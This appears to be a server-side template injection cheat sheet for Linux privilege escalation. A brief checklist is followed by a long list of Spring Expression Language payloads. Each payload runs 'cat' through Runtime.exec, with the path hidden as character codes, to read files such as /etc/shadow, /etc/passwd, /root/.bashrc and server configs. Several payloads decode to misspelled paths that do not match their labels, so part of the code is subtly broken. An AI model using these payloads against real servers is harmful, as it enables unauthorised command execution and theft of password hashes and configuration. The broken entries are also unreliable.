# Server-Side-Template-Injection - Linux - Privilege Escalation

Template injection allows an attacker to include template code into an existant (or not) template. 
A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages


SSTI - Linux Privilege Escalation Checklists 

System Information:
Hostname
Networking details:
Current IP
Default route details
User Information:
Current user details
Shows users logged onto the host
List all users including uid/gid information
List root accounts
Extracts password policies and hash storage method information
Checks if password hashes are stored in /etc/passwd
Attempt to read restricted files i.e. /etc/shadow
List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.)
Basic SSH checks

Privileged access:
Which users have recently used sudo
Determine if /etc/sudoers is accessible
Determine if the current user has Sudo access without a password
Are known 'good' breakout binaries available via Sudo (i.e. nmap, vim etc.)
Is root's home directory accessible
List permissions for /home/ 

Payloads: 

Basic injection  

#${7*7}  

${{7*7}} 

%7B%7B4*4%7D%7D 

nxmve$%7B30*30%7Dac2nj 

${T(java.lang.System).getenv()}.  


/etc/passwd 

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())} 


/etc/hosts 

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(115))).getInputStream())} 

/etc/shadow

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(119))).getInputStream())} 


/etc/group

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(112))).getInputStream())} 

/etc/issue

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(101))).getInputStream())} 

/etc/motd 

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(100))).getInputStream())} 

/etc/mysql/my.cnf

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(113)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(102))).getInputStream())} 

/etc/networks

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(115))).getInputStream())} 


/root/.bashrc 

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99))).getInputStream())} 

/etc/bashrc  

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99))).getInputStream())} 

/etc/nginx.conf 

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(102))).getInputStream())} 

/etc/mail/access

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115))).getInputStream())}

/etc/netconfig 

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(103))).getInputStream())}

/etc/services 

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(115))).getInputStream())} 


/etc/redis/redis.conf 

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(102))).getInputStream())}

/etc/rsyslog.conf 

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(102))).getInputStream())}

/etc/ntp.conf

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(102))).getInputStream())} 

var/log/apache/access.log

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(103))).getInputStream())}

/var/log/httpd/error_log 

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(103))).getInputStream())}
